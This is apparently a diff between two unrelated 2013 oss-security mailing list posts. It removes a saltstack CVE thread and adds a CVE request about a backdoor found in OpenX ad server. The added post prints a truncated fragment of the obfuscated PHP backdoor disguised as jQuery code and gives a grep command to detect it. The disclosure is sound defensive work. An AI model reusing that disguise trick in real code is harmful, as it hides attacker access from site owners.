@@ -1,78 +1,73 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/10/18/3
-Message-ID: <52619329.2010704@redhat.com>
-Date: Fri, 18 Oct 2013 13:59:37 -0600
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/06/14
+Message-ID: <52018C26.5050706@redhat.com>
+Date: Tue, 06 Aug 2013 17:52:06 -0600
 From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security@...ts.openwall.com, Michael Scherer <mscherer@...hat.com>, info@...tstack.com
-Subject: Re: CVE request for saltstack minion identity usurpation
+To: Open Source Security <oss-security@...ts.openwall.com>, Assign a CVE Identifier <cve-assign@...re.org>, "Steven M. Christey" <coley@...re.org>
+Subject: OpenX Ad Server Backdoor CVE?
 Content-Type: text/plain; charset=utf-8
 
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA1
 
-On 10/16/2013 12:20 AM, Kurt Seifried wrote:
-> On 10/15/2013 11:54 PM, Kurt Seifried wrote:
->> On 10/11/2013 04:26 PM, Michael Scherer wrote:
->>> Hi,
-> 
->>> While looking for saltstack issues on github, i stumbled on
->>> this pull request :
->>> https://github.com/saltstack/salt/pull/7356
-> 
->>> It seems that saltstack, a client/server configuration system (
->>>  like puppet, chef, cfengine ) allowed to have any minions ( 
->>> agent on the server to be configured ) to masquerade itself as 
->>> any others agents when requesting stuff from the master ( ie, 
->>> main server ). While I didn't fully check, this would permit a 
->>> compromised server to request data from another server, thus 
->>> leading to potential informations leak ( like passwword, etc
->>> ).
-> 
->>> Can a CVE be assigned, and I will pass it to upstream on the
->>> bug report ?
-> 
->> Ok mmcallis@ researched these and found:
-> 
->> CVE-2013-4435 saltstack Insufficient argument validation in 
->> several modules
-> 
->> CVE-2013-4436 saltstack MITM ssh attack on salt-ssh
-> 
->> CVE-2013-4437 saltstack Insecure usage of a predictable
->> directory in /tmp and on minion (CVE MERGE of two tmp issues)
-> 
->> CVE-2013-4438 saltstack pillar.ext or qemu_nbd.clear yaml string 
->> RCE
-> 
-> Argh. The above are currently embargoed, I misunderstood and
-> thought they were public (along with the following one). My
-> apologies, especially to upstream and users of saltstack. Adding
-> saltstack info@ to the CC (can't find a security address).
-> 
->> CVE-2013-4439 saltstack minion identity usurpation
+I assume this needs a CVE? Mitre have you guys seen a request for one?
 
-These issues re now public:
+https://isc.sans.edu/diary/OpenX+Ad+Server+Backdoor/16303
 
-http://docs.saltstack.com/topics/releases/0.17.1.html
+According to a post by Heise Security, a backdoor has been spotted in
+the popular open source ad software OpenX [1][2]. Appearantly the
+backdoor has been present since at least November 2012. I tried to
+download the source to verify the information, but it appears the
+files have been removed.
 
+The backdoor is disguised as php code that appears to create a jQuery
+javascript snippet:
+
+this.each(function(){l=flashembed(this,k,j)}<!--?php /*if(e)
+{jQuery.tools=jQuery.tools||{version:
+{}};jQuery.tools.version.flashembed='1.0.2';
+*/$j='ex'./**/'plode'; /* if(this.className ...
+Heise recommends to search the ".js" files of OpenX for php code to
+find out if your version of OpenX is the backdoored version.
+
+find . -name \*.js -exec grep -l '<?php' {} \;
+The backdoor can then be used by an attacker to upload a shell to
+www/images/debugs.php . We have seen in the past several web sites
+that delivered malicious ads served by compromissed ad servers. This
+could be the reason for some of these compromisses.
+
+If you run OpenX:
+
+verify the above information (and let us know)
+if you can find the backdoor, disable/ininstall OpenX
+make sure you remove the "debug.php" file
+best: rebuild the server if you can
+Heise investigated a version 2.8.10 of OpenX with a data of December
+9th and an md5 of 6b3459f16238aa717f379565650cb0cf for the
+openXVideoAds.zip file.
+
+[1]
+http://www.heise.de/newsticker/meldung/Achtung-Anzeigen-Server-OpenX-enthaelt-eine-Hintertuer-1929769.html
+(only in German at this point)
+[2] http://www.openx.com
 
 - -- 
 Kurt Seifried Red Hat Security Response Team (SRT)
 PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
 -----BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.15 (GNU/Linux)
+Version: GnuPG v1.4.13 (GNU/Linux)
 
-iQIcBAEBAgAGBQJSYZMpAAoJEBYNRVNeJnmTXoMQANz9+Q6mpW6LhyN4l2a8HIg5
-ILkk3EGr38/QcE+AFSjh13TF1KvWIcOE+XxevkExYzSrrPzJerY87uX89yTLXBUy
-JsDjPbUvv9QjtS7Imf3SWtcnL9AZ7BrUHwXBc0dIqB2tUdlbU2d1LNqfCM77pRaO
-8y9B8LM429dnauAh5am+3k7D0rOpXuIjEoZ73YDw+XktWQAgUDf85ImUtXiDZ4w1
-WQocOmFdHAAIA8Ymo3xqSi61CAxmKqQvdaOZR/LN+v6LeZD+bDJnJyYb3pCt6QCK
-05wlSPYmTPQSfuCO1o0lOK1Y2gHomfFFZXqrl4DejqC4krXN/z20QM7stPAfjXSH
-pBlPZjj8+Ga2a2+p4Ju/4AdMANq5WT7JRORCf8HO3tEYB+F3SVDKdCA8pCEfXq6h
-lCwcPpxAwWy+fFTxoE4fi2And8i82dHRyRAUmG9VNpuxQSvRjmWy52tRuEjPAXfg
-KvvgGCtj/0BpGmXbgRZLp9xdy3YiP3Hzzjp7oxAdO145oOt/UleTPJ5eWUiMYOQ6
-6cEwewBb1Jrr9/95NQRdmewXJ7ZIEGzjsRh3QAcScVTM8oqUfVYBvzkzL747324a
-AH5yoB1IxNHbqoTwMYZC9HKHPKQ+HSfAovTnk+U6t4tWnh15DBthzx2g9lEZOH+R
-BYYDlu7Bz/jUp0nSsXgR
-=MkNI
+iQIcBAEBAgAGBQJSAYwlAAoJEBYNRVNeJnmTA1QP/iLg3bTRGfpPHLRLiXgbc+wK
+CqiqK9tiqMHnzPj2eNR+qP6xLGquLdaqG7AXnD7X8IZk1IYAwV0X2AMaKyLMbc3K
+sMy48cLQ6r+VIi48zWuDz5A0twYjfDnFdjr6660lvI6zgR4wA5dGhz5U8jBeoqF3
+RV0DdjRI2raZqc3i/93LN6gA8worgp9LNYxRuMXazYHaRPZRlSllJ5jxfTIAAJJh
+3Fu3ersiMER5ENG/LIwDmnH2g+Lk0H225QXgVd5G7YydC84uOtqjzoafAwZLyyof
+vv46mdWLGFy0SFpUYQphrkZW3eL09KS7EvkU4yaQYE21txJ7qA1qcxIXGFyHSoeL
+DmfMvx14DmDubCuUtPAgDCHfsu/cP77zvtPppXXlxK8Bw8MiE0htMgKwLXv/PiJe
+RBK5BUnRVw8P/LWdyTQ9szm0xW57aD7JNdE5jfMQlnVQnDVurGAvDh1VPFZrx4sg
+MNde8ThUQgvh1JAx29cYB8JrRlUaTgpVdVKis4fuVdFNFI3/fKRBz7T//WDt6ihW
+LCxVxQwJiTBs/PLKn/7EzTTvmQM5m4G7c0wsKbgPwPq9vvii9ub8vGANXDVEMGeU
+pEoLDkvXB0BI8MnyrY161OO31tGmli+y+mh5mNzR6U5TQU3pGxlkvyKR+SjGs7nE
+2PP+qonzo/8fnbykvSJp
+=xfps
 -----END PGP SIGNATURE-----
